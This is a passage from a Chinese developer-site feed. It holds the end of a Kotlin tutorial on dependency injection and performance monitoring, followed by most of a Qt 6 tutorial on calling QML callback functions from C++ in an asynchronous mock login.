        <span class="hljs-keyword">val</span> <span class="hljs-keyword">constructor</span> = clazz.primaryConstructor
            ?: <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"类 <span class="hljs-subst">${clazz.simpleName}</span> 没有主构造函数"</span>)
        
        <span class="hljs-keyword">val</span> parameters = <span class="hljs-keyword">constructor</span>.parameters.map { param -&gt;
            <span class="hljs-keyword">if</span> (param.hasAnnotation&lt;Inject&gt;()) {
                <span class="hljs-keyword">get</span>(param.type.classifier <span class="hljs-keyword">as</span> KClass&lt;*&gt;)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"无法解析依赖: <span class="hljs-subst">${param.name}</span>"</span>)
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">constructor</span>.call(*parameters.toTypedArray())
    }
}

<span class="hljs-comment">// 使用迷你 DI 框架</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">findUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String
}

<span class="hljs-meta">@Singleton</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseUserRepository</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>() : UserRepository {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">findUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String = <span class="hljs-string">"用户 <span class="hljs-variable">$id</span> 来自数据库"</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String
}

<span class="hljs-meta">@Singleton</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> userRepository: UserRepository
) : UserService {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"服务: <span class="hljs-subst">${userRepository.findUser(id)}</span>"</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> userService: UserService
) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">showUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"控制器: <span class="hljs-subst">${userService.getUser(id)}</span>"</span>
    }
}

<span class="hljs-comment">// 测试迷你框架</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testMiniDI</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> container = DIContainer()
    
    <span class="hljs-comment">// 注册依赖</span>
    container.register(UserRepository::<span class="hljs-keyword">class</span>, DatabaseUserRepository::<span class="hljs-keyword">class</span>)
    container.register(UserService::<span class="hljs-keyword">class</span>, UserServiceImpl::<span class="hljs-keyword">class</span>)
    container.register(UserController::<span class="hljs-keyword">class</span>)
    
    <span class="hljs-comment">// 使用依赖注入</span>
    <span class="hljs-keyword">val</span> controller = container.<span class="hljs-keyword">get</span>&lt;UserController&gt;()
    <span class="hljs-keyword">val</span> result = controller.showUser(<span class="hljs-number">1</span>)
    
    println(<span class="hljs-string">"DI 框架测试结果: <span class="hljs-variable">$result</span>"</span>)
    
    <span class="hljs-comment">// 验证单例模式</span>
    <span class="hljs-keyword">val</span> repo1 = container.<span class="hljs-keyword">get</span>&lt;UserRepository&gt;()
    <span class="hljs-keyword">val</span> repo2 = container.<span class="hljs-keyword">get</span>&lt;UserRepository&gt;()
    println(<span class="hljs-string">"单例验证: <span class="hljs-subst">${repo1 === repo2}</span>"</span>) <span class="hljs-comment">// 应该输出 true</span>
}
</code></pre>
<h4 data-id="heading-17"><strong>四十五、Kotlin 性能监控与调试</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 性能监控工具类</span>
<span class="hljs-keyword">object</span> PerformanceMonitor {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> timings = mutableMapOf&lt;String, <span class="hljs-built_in">Long</span>&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> counters = mutableMapOf&lt;String, <span class="hljs-built_in">Int</span>&gt;()
    
    <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">measure</span><span class="hljs-params">(operation: <span class="hljs-type">String</span>, block: () -&gt; <span class="hljs-type">T</span>)</span></span>: T {
        <span class="hljs-keyword">val</span> startTime = System.nanoTime()
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> block()
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">val</span> duration = System.nanoTime() - startTime
            timings.merge(operation, duration) { old, new -&gt; (old + new) / <span class="hljs-number">2</span> }
            counters.merge(operation, <span class="hljs-number">1</span>) { old, new -&gt; old + new }
            println(<span class="hljs-string">"<span class="hljs-variable">$operation</span> 耗时: <span class="hljs-subst">${duration / <span class="hljs-number">1</span>_000_000}</span>ms"</span>)
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">printStatistics</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"\n=== 性能统计 ==="</span>)
        timings.forEach { (operation, avgTime) -&gt;
            <span class="hljs-keyword">val</span> count = counters[operation] ?: <span class="hljs-number">0</span>
            println(<span class="hljs-string">"<span class="hljs-variable">$operation</span>: 平均 <span class="hljs-subst">${avgTime / <span class="hljs-number">1</span>_000_000}</span>ms (调用 <span class="hljs-variable">$count</span> 次)"</span>)
        }
    }
}

<span class="hljs-comment">// 使用性能监控</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testPerformanceMonitoring</span><span class="hljs-params">()</span></span> {
    PerformanceMonitor.measure(<span class="hljs-string">"数据加载"</span>) {
        Thread.sleep(<span class="hljs-number">500</span>) <span class="hljs-comment">// 模拟耗时操作</span>
    }
    
    PerformanceMonitor.measure(<span class="hljs-string">"数据处理"</span>) {
        repeat(<span class="hljs-number">1000</span>) { i -&gt;
            PerformanceMonitor.measure(<span class="hljs-string">"内部操作"</span>) {
                <span class="hljs-comment">// 模拟内部操作</span>
                Math.sqrt(i.toDouble())
            }
        }
    }
    
    PerformanceMonitor.printStatistics()
}
</code></pre>
<h4 data-id="heading-18"><strong>下一步：成为 Kotlin 专家</strong></h4>
<p>你现在已经掌握了 Kotlin 的终极技能！接下来可以：</p>
<ol>
<li><strong>参与 Kotlin 编译器开发</strong>：贡献给 Kotlin 语言本身</li>
<li><strong>开发 Kotlin 编译器插件</strong>：创建自定义语言特性</li>
<li><strong>研究 Kotlin 编译器内部机制</strong>：理解类型推断、代码生成</li>
<li><strong>探索 Kotlin 多平台前沿</strong>：实验性特性和新平台支持</li>
<li><strong>贡献开源 Kotlin 项目</strong>：成为 Kotlin 生态系统的一部分</li>
</ol>
<p>你已经从 Kotlin 新手成长为可以探索语言设计深度的专家！继续实践，将这些高级技术应用到实际项目中，创造真正优秀的技术解决方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Qt 6 实战：C++ 调用 QML 回调方法（异步场景完整实现）]]></title>    <link>https://juejin.cn/post/7576108254604099627</link>    <guid>https://juejin.cn/post/7576108254604099627</guid>    <pubDate>2025-11-24T11:58:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576108254604099627" data-draft-id="7576108254604083243" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Qt 6 实战：C++ 调用 QML 回调方法（异步场景完整实现）"/> <meta itemprop="keywords" content="前端,Qt,C++"/> <meta itemprop="datePublished" content="2025-11-24T11:58:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="喵个咪"/> <meta itemprop="url" content="https://juejin.cn/user/1350630784901262"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Qt 6 实战：C++ 调用 QML 回调方法（异步场景完整实现）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1350630784901262/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    喵个咪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:58:34.000Z" title="Mon Nov 24 2025 11:58:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Qt 6 实战：C++ 调用 QML 回调方法（异步场景完整实现）</h2>
<p>在 Qt 6 开发中，C++ 与 QML 混合编程是常见场景。当 C++ 处理异步操作（如登录验证、网络请求、数据库查询）时，需要将结果通知给 QML 界面，<strong>回调函数</strong>是最直观的通信方式之一。本文将基于你提供的代码框架，补充关键细节、修复潜在问题，并完整实现从 C++ 调用 QML 回调的全流程。</p>
<h3 data-id="heading-1">一、核心场景说明</h3>
<p>我们需要实现：</p>
<ol>
<li>QML 调用 C++ 的 <code>login</code> 方法（传入用户名、密码和两个回调函数：成功回调 <code>onSuccess</code>、失败回调 <code>onFailure</code>）；</li>
<li>C++ 异步处理登录逻辑（模拟耗时操作）；</li>
<li>登录完成后，C++ 调用对应的 QML 回调函数，将结果（成功响应 / 错误信息）传递给 QML。</li>
</ol>
<h3 data-id="heading-2">二、Step 1：完善 C++ 服务类</h3>
<h4 data-id="heading-3">1.1 基础配置（必须继承 QObject）</h4>
<p>QML 能调用的 C++ 方法 / 属性，依赖 Qt 的元对象系统（MOC），因此 <code>AuthenticationService</code> 必须：</p>
<ul>
<li>继承 <code>QObject</code>；</li>
<li>添加 <code>Q_OBJECT</code> 宏；</li>
<li>用 <code>Q_INVOKABLE</code> 标记需要暴露给 QML 的方法。</li>
</ul>
<h4 data-id="heading-4">1.2 完整 C++ 代码实现</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// authentication_service.h</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QObject&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QJSValue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QJSEngine&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QtConcurrent&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QThread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QMetaObject&gt;</span></span>

<span class="hljs-comment">// 自定义错误类：封装错误码、错误信息</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">KratosError</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">KratosError</span>(<span class="hljs-type">int</span> code, <span class="hljs-type">const</span> QString&amp; message, <span class="hljs-type">const</span> QString&amp; details = <span class="hljs-string">""</span>)
        : <span class="hljs-built_in">m_code</span>(code), <span class="hljs-built_in">m_message</span>(message), <span class="hljs-built_in">m_details</span>(details) {}

    <span class="hljs-comment">// 转换为 QJSValue，供 QML 访问属性</span>
    <span class="hljs-function">QJSValue <span class="hljs-title">toQJSValue</span><span class="hljs-params">(QJSEngine&amp; engine)</span> <span class="hljs-type">const</span> </span>{
        QJSValue errorObj = engine.<span class="hljs-built_in">newObject</span>();
        errorObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"code"</span>, m_code);       <span class="hljs-comment">// 错误码（如 401 未授权）</span>
        errorObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"message"</span>, m_message); <span class="hljs-comment">// 错误提示</span>
        errorObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"details"</span>, m_details); <span class="hljs-comment">// 详细信息（可选）</span>
        <span class="hljs-keyword">return</span> errorObj;
    }

<span class="hljs-keyword">private</span>:
    <span class="hljs-type">int</span> m_code;
    QString m_message;
    QString m_details;
};

<span class="hljs-comment">// 登录成功响应类：封装返回数据</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">LoginResponse</span> {
    QString token;     <span class="hljs-comment">// 身份令牌</span>
    QString username;  <span class="hljs-comment">// 用户名</span>
    <span class="hljs-type">int</span> userId;        <span class="hljs-comment">// 用户 ID</span>

    <span class="hljs-comment">// 转换为 QJSValue，供 QML 访问属性</span>
    <span class="hljs-function">QJSValue <span class="hljs-title">toQJSValue</span><span class="hljs-params">(QJSEngine&amp; engine)</span> <span class="hljs-type">const</span> </span>{
        QJSValue respObj = engine.<span class="hljs-built_in">newObject</span>();
        respObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"token"</span>, token);
        respObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"username"</span>, username);
        respObj.<span class="hljs-built_in">setProperty</span>(<span class="hljs-string">"userId"</span>, userId);
        <span class="hljs-keyword">return</span> respObj;
    }
};

<span class="hljs-comment">// 认证服务类（单例模式）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthenticationService</span> : <span class="hljs-keyword">public</span> QObject {
    Q_OBJECT <span class="hljs-comment">// 必须添加，启用元对象系统</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 单例获取方法（线程安全）</span>
    <span class="hljs-function"><span class="hljs-type">static</span> AuthenticationService* <span class="hljs-title">instance</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-type">static</span> QMutex mutex;
        <span class="hljs-keyword">if</span> (!m_instance) {
            mutex.<span class="hljs-built_in">lock</span>();
            <span class="hljs-keyword">if</span> (!m_instance) {
                m_instance = <span class="hljs-keyword">new</span> <span class="hljs-built_in">AuthenticationService</span>();
            }
            mutex.<span class="hljs-built_in">unlock</span>();
        }
        <span class="hljs-keyword">return</span> m_instance;
    }

    <span class="hljs-comment">// 禁止拷贝构造和赋值</span>
    <span class="hljs-built_in">AuthenticationService</span>(<span class="hljs-type">const</span> AuthenticationService&amp;) = <span class="hljs-keyword">delete</span>;
    AuthenticationService&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> AuthenticationService&amp;) = <span class="hljs-keyword">delete</span>;

    <span class="hljs-comment">// 暴露给 QML 的登录方法</span>
    <span class="hljs-function">Q_INVOKABLE <span class="hljs-type">void</span> <span class="hljs-title">login</span><span class="hljs-params">(
        <span class="hljs-type">const</span> QString&amp; username,
        <span class="hljs-type">const</span> QString&amp; password,
        <span class="hljs-type">const</span> QJSValue&amp; onSuccess,  <span class="hljs-comment">// QML 传入的成功回调</span>
        <span class="hljs-type">const</span> QJSValue&amp; onFailure   <span class="hljs-comment">// QML 传入的失败回调</span>
    )</span></span>;

<span class="hljs-keyword">private</span>:
    <span class="hljs-built_in">AuthenticationService</span>(QObject* parent = <span class="hljs-literal">nullptr</span>) : <span class="hljs-built_in">QObject</span>(parent) {}
    <span class="hljs-type">static</span> AuthenticationService* m_instance;
};

<span class="hljs-comment">// authentication_service.cpp</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"authentication_service.h"</span></span>

AuthenticationService* AuthenticationService::m_instance = <span class="hljs-literal">nullptr</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AuthenticationService::login</span><span class="hljs-params">(
    <span class="hljs-type">const</span> QString&amp; username,
    <span class="hljs-type">const</span> QString&amp; password,
    <span class="hljs-type">const</span> QJSValue&amp; onSuccess,
    <span class="hljs-type">const</span> QJSValue&amp; onFailure
)</span> </span>{
    <span class="hljs-comment">// 1. 有效性检查：确保 QJSEngine 和回调函数有效</span>
    QJSEngine* engine = <span class="hljs-built_in">qjsEngine</span>(<span class="hljs-keyword">this</span>);
    <span class="hljs-keyword">if</span> (!engine) {
        <span class="hljs-built_in">qWarning</span>() &lt;&lt; <span class="hljs-string">"[AuthService] 失败：无法获取 QJSEngine 上下文"</span>;
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (!onSuccess.<span class="hljs-built_in">isCallable</span>() &amp;&amp; !onFailure.<span class="hljs-built_in">isCallable</span>()) {
        <span class="hljs-built_in">qWarning</span>() &lt;&lt; <span class="hljs-string">"[AuthService] 警告：未传入有效回调函数"</span>;
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. 异步处理登录逻辑（模拟耗时操作：如网络请求、数据库验证）</span>
    <span class="hljs-comment">// 用 QtConcurrent::run 开启后台线程，避免阻塞 UI 线程</span>
    QtConcurrent::<span class="hljs-built_in">run</span>([=, <span class="hljs-keyword">this</span>]() {
        <span class="hljs-comment">// 模拟耗时 2 秒（实际场景替换为真实登录逻辑）</span>
        QThread::<span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>);

        <span class="hljs-comment">// 3. 模拟登录验证结果（实际场景替换为真实校验逻辑）</span>
        <span class="hljs-type">bool</span> isLoginSuccess = (username == <span class="hljs-string">"admin"</span> &amp;&amp; password == <span class="hljs-string">"123456"</span>);

        <span class="hljs-comment">// 4. 切换回主线程执行回调（关键！QJSValue 必须在创建它的线程调用）</span>
        QMetaObject::<span class="hljs-built_in">invokeMethod</span>(<span class="hljs-keyword">this</span>, [=, <span class="hljs-keyword">this</span>]() {
            <span class="hljs-keyword">if</span> (isLoginSuccess) {
                <span class="hljs-comment">// 登录成功：构造响应对象，调用 onSuccess 回调</span>
                <span class="hljs-keyword">if</span> (onSuccess.<span class="hljs-built_in">isCallable</span>()) {
                    LoginResponse resp;
                    resp.token = <span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span>;
                    resp.username = username;
                    resp.userId = <span class="hljs-number">1001</span>;

                    QJSValueList args;
                    args &lt;&lt; resp.<span class="hljs-built_in">toQJSValue</span>(*engine); <span class="hljs-comment">// 传入响应数据</span>
                    onSuccess.<span class="hljs-built_in">call</span>(args);             <span class="hljs-comment">// 调用 QML 成功回调</span>
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 登录失败：构造错误对象，调用 onFailure 回调</span>
                <span class="hljs-keyword">if</span> (onFailure.<span class="hljs-built_in">isCallable</span>()) {
                    KratosError <span class="hljs-built_in">error</span>(<span class="hljs-number">401</span>, <span class="hljs-string">"登录失败"</span>, <span class="hljs-string">"用户名或密码错误"</span>);

                    QJSValueList args;
                    args &lt;&lt; error.<span class="hljs-built_in">toQJSValue</span>(*engine); <span class="hljs-comment">// 传入错误信息</span>
                    onFailure.<span class="hljs-built_in">call</span>(args);              <span class="hljs-comment">// 调用 QML 失败回调</span>
                }
            }
        }, Qt::QueuedConnection); <span class="hljs-comment">// 队列连接：确保在主线程执行</span>
    });
}
</code></pre>
<h3 data-id="heading-5">三、Step 2：注册 C++ 单例到 QML</h3>
<p>在 <code>main.cpp</code> 中，将 <code>AuthenticationService</code> 单例注册到 QML 上下文，让 QML 可以直接访问：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// main.cpp</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QGuiApplication&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QQmlApplicationEngine&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"authentication_service.h"</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> </span>{
    <span class="hljs-function">QGuiApplication <span class="hljs-title">app</span><span class="hljs-params">(argc, argv)</span></span>;

    QQmlApplicationEngine engine;

    <span class="hljs-comment">// 注册 C++ 单例到 QML（模块名：backend，版本：1.0，对象名：AuthenticationService）</span>
    <span class="hljs-built_in">qmlRegisterSingletonInstance</span>(
        <span class="hljs-string">"backend"</span>,                <span class="hljs-comment">// QML 导入时的模块名</span>
        <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,                     <span class="hljs-comment">// 版本号（需与 QML import 一致）</span>
        <span class="hljs-string">"AuthenticationService"</span>,  <span class="hljs-comment">// QML 中访问的对象名</span>
        AuthenticationService::<span class="hljs-built_in">instance</span>() <span class="hljs-comment">// 单例实例</span>
    );

    <span class="hljs-comment">// 加载 QML 主文件</span>
    <span class="hljs-function"><span class="hljs-type">const</span> QUrl <span class="hljs-title">url</span><span class="hljs-params">(<span class="hljs-string">u"qrc:/LoginDemo/main.qml"</span>_qs)</span></span>;
    QObject::<span class="hljs-built_in">connect</span>(&amp;engine, &amp;QQmlApplicationEngine::objectCreationFailed,
        &amp;app, []() { QCoreApplication::<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); },
        Qt::QueuedConnection);
    engine.<span class="hljs-built_in">load</span>(url);

    <span class="hljs-keyword">return</span> app.<span class="hljs-built_in">exec</span>();
}
</code></pre>
<p><strong>关键注意：</strong></p>
<ul>
<li>注册时模块名（<code>backend</code>）、版本号（<code>1.0</code>）必须与 QML 中的 <code>import</code> 语句一致；</li>
<li>单例注册需用 <code>qmlRegisterSingletonInstance</code>（Qt 5.15+ 支持，Qt 6 推荐），而非 <code>qmlRegisterSingletonType</code>（后者适合动态创建单例）。</li>
</ul>
<h3 data-id="heading-6">四、Step 3：QML 中调用 C++ 方法并处理回调</h3>
<p>在 QML 界面中，导入注册的模块，调用 <code>AuthenticationService.login</code> 并传入回调函数：</p>
<pre><code class="hljs language-qml" lang="qml">// main.qml
import QtQuick 6.2
import QtQuick.Controls 6.2
import backend 1.0 // 导入 C++ 注册的模块（需与注册时的模块名、版本一致）

ApplicationWindow {
    width: 400
    height: 300
    title: "登录演示"
    visible: true

    ColumnLayout {
        anchors.centerIn: parent
        spacing: 16

        TextField {
            id: usernameField
            placeholderText: "输入用户名"
            Layout.width: 250
            text: "admin" // 测试用默认值
        }

        TextField {
            id: passwordField
            placeholderText: "输入密码"
            echoMode: TextField.Password
            Layout.width: 250
            text: "123456" // 测试用默认值（正确密码）
            // text: "wrong" // 测试失败场景
        }

        Button {
            text: "登录"
            Layout.width: 250
            onClicked: {
                // 调用 C++ 的 login 方法，传入回调函数
                AuthenticationService.login(
                    usernameField.text,
                    passwordField.text,
                    // 成功回调：接收 C++ 传递的响应数据
                    function(response) {
                        console.log("登录成功！响应：", JSON.stringify(response))
                        // 访问响应属性（C++ 中 LoginResponse 的字段）
                        console.log("Token:", response.token)
                        console.log("用户名:", response.username)
                    },
                    // 失败回调：接收 C++ 传递的错误信息
                    function(error) {
                        console.log("登录失败！错误码：", error.code, " 信息：", error.message)
                        // 在界面显示错误提示
                        errorLabel.text = error.message
                    }
                )
            }
        }

        Label {
            id: errorLabel
            color: "red"
            Layout.width: 250
            horizontalAlignment: Text.AlignCenter
        }
    }
}
</code></pre>
<h3 data-id="heading-7">五、核心技术关键点解析</h3>
<h4 data-id="heading-8">1. QJSValue：C++ 与 QML 回调的桥梁</h4>
<ul>
<li><code>QJSValue</code> 是 Qt 中封装 JavaScript 值的类，支持存储函数、对象、基本类型等；</li>
